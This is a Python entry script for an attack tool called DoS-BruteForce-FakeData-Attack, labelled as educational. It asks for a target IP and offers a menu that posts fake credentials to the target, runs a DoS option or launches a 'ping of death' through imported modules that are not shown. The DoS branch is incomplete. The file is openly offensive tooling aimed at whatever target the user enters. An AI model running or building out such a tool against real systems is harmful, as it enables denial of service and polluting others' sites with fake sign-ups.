# ! /usr/bin/python
# """
# /* #############################################################################
# **    File           : main.py
# **    Proyect        : DoS-BruteForce-FakeData-Attack
# **    IDE            : Visual Studio Code
# **    Language       : Python 3.9.7
# **    OS             : Ubuntu 21.10
# **    Date/Hour      : 03/31/2022
# **    Description    :
# **         A Python tool to perform DoS, brute force and fake data fill attacks
# **         For educational purposes only*
# **   Authors         :
# **            Gerardo B Zenteno M. https://github.com/GerardoBZentenoM
# **
# **   Versión        : Beta
# **   Revisión       : A
# **   Release        : 0.0.2
# **   Bugs & Fixes   :
# **
# **   Date           :
# **
# **
# **   Usage          : sudo python3 main.py
#    ###########################################################################*/
# """
import os
from attacks import fake_data, ping_of_death

from sources.art import welcome
from validations import target_validation


print(welcome)
print(
    "Description: A Python tool to perform DoS, brute force and fake data fill attacks."
)
print("Please, only use this to educational propose.")
print("DON'T USE IN LEGITIM WEBSITES.\n")

if "SUDO_UID" not in os.environ.keys():
    print("Try running this program with sudo.")
    print("Try with: 'sudo ./.venv/bin/python3.9 main.py main.py'")
    exit()


target = input("Enter the IP address to test ej. http://localhost \n")
target_ip, target_net = target_validation(target)

print(f"The direcction of the target is: {target_ip} net: {target_net}")

attack = input(
    """
Select some of the folowing tests:
1) Post random and fake data
2) DoS Attack
3) Ping of the death test

: """
)

if attack == "1":
    print("Post in the target the following data: ")
    number_of_requests = int(
        input("Select the number of requests do you want, ej. 10: ")
    )

    for _ in range(number_of_requests):
        credentials = fake_data(
            target, username=True, password=True, phone=True, email=True
        )
        print(credentials)
elif attack == "2":
    print("DoS Attack")
    number_of_requests = int(
        input("Select the number of requests do you want, ej. 10: ")
    )
else:
    print("Another attack")
    ping_of_death(10, target_ip)
